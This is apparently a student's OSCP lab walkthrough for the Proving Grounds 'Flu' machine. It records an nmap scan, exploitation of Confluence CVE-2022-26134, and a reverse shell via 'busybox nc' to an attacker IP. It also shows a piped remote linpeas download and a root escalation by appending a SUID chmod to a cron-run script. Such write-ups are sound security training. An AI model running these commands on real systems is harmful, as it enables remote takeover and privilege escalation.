---
Date: 2024-10-13
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: In progress
IP: 192.168.117.41
Writeup: https://medium.com/@basha5969/flu-proving-grounds-5325abd4a4f2
---
# Flu
This is the first box I can confidently say I did ***NOT*** look at a walkthrough for any help on! I've included one in the details above, but it remained as a background tab the entire way through this - massive confidence boost to know I can do this without needing to follow someone else's footsteps!

Seeing Confluence when I checked the html port was a big confidence booster too, as I've worked with it a lot already and knew there were plenty of vulnerabilities and exploit available for older versions. Getting RCE was incredibly simple, and then it was simply a case of enumerating the target to find a privilege escalation vector. 

I'm building confidence with `pspy` too, although I know I need to keep it handier... and to run it with the timeout command (`timeout 20 ./pspy`) so it doesn't break my shell! As soon as I ran it and saw the running script I knew that'd be the vector I needed, but there was still a lot of uncertainty until I realised it was running every 5 mins - waited a few mins before trying `/bin/bash -p` again, and got access!

# Resolution summary
- Ran Nmap to identify ports `22` & `8080`
- Visited http (`8090`) & identified `Confluence v7.13.6`
- Identified exploit for CVE-2022-26134 and ran against target for reverse shell
- Uploaded `pspy` and identified `log-backup.sh` being run regularly by `root`
- Added command to change `/bin/bash` SUID and waited for script to run
- Ran `/bin/bash -p` to become `root`
## Improved skills
- Linux Priv Escalation
## Used tools
- nmap
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Flu.nmap 192.168.117.41 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  opsmessaging?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 
|     Cache-Control: no-store
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     X-Confluence-Request-Time: 1728796841602
|     Set-Cookie: JSESSIONID=D518E2E9A0A5F7BFDA68A6A59D3D9A57; Path=/; HttpOnly
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Content-Security-Policy: frame-ancestors 'self'
|     Location: http://localhost:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 0
|     Date: Sun, 13 Oct 2024 05:20:41 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 
|     MS-Author-Via: DAV
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 0
|     Date: Sun, 13 Oct 2024 05:20:41 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1924
|     Date: Sun, 13 Oct 2024 05:20:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
1 service unrecognized despite returning data.
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 8090 - HTTP (Confluence)
- Navigated `http://192.168.117.41:8090` and identified `Confluence 7.13.6`
![[Cybersecurity-Resources/images/Pasted image 20241013155309.png]]
	- Potentially vulnerable to CVE-2022-26134

---
# Exploitation
## CVE-2022-26314 - OGNL Injection
- Used `searchsploit` to identify exploit `50952.py` for CVE-2022026134. Copied exploit to local host and ran `python3 50952.py -u 192.168.117.41:8090 -c id` to test output
![[Cybersecurity-Resources/images/Pasted image 20241013160053.png]]
- Ran exploit again to establish reverse shell `python3 50952.py -u 192.168.117.41:8090 -c 'busybox nc 192.168.45.250 4444 -e /bin/sh'`
![[Cybersecurity-Resources/images/Pasted image 20241013161411.png]]
- Ran `find / -name local.txt -type f 2>/dev/null` to find `local.txt` then ran `cat /home/confluence/local.txt` to print `edf698cdc0831e7a2fd857ca3ad2191a`
![[Cybersecurity-Resources/images/Pasted image 20241013161607.png]]
---
# Lateral Movement to user
## Local Enumeration
- Ran `cat /etc/passwd` to identify any other users
![[Cybersecurity-Resources/images/Pasted image 20241013161842.png]]
- Downloaded & ran `suid3num.py` to enumerate useful SUID binaries - none found
![[Cybersecurity-Resources/images/Pasted image 20241013162422.png]]
![[Cybersecurity-Resources/images/Pasted image 20241013162446.png]]
- Downloaded & ran `linpeas.sh` with `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` - nothing obviously useful
![[Cybersecurity-Resources/images/Pasted image 20241013162640.png]]
- Ran `cat /home/confluence/.bash_history` to check bash history
![[Cybersecurity-Resources/images/Pasted image 20241013164109.png]]
---
# Privilege Escalation
## Local Enumeration
- Downloaded & ran `pspy32` - identified `/opt/log-backup.sh` being run regularly by `root`
![[Cybersecurity-Resources/images/Pasted image 20241013165029.png]]
- Ran `ls -lah /opt/log-backup.sh` to check script privileges
![[Cybersecurity-Resources/images/Pasted image 20241013165554.png]]
## Privilege Escalation vector
- Ran `echo "chmod +s /bin/bash" >> /opt/log-backup.sh` & confirmed written to `/opt/log-backup.sh`
![[Cybersecurity-Resources/images/Pasted image 20241013170214.png]]
- Waited several minutes for script, then ran `/bin/bash -p` for privileged shell as `root`
![[Cybersecurity-Resources/images/Pasted image 20241013170318.png]]
- Ran `cat /root/proof.txt` to print `7b793953252334bfadee03b30874aee2`
![[Cybersecurity-Resources/images/Pasted image 20241013170420.png]]
---
# Trophy & Loot
`local.txt` = `edf698cdc0831e7a2fd857ca3ad2191a`
`root.txt` = `7b793953252334bfadee03b30874aee2`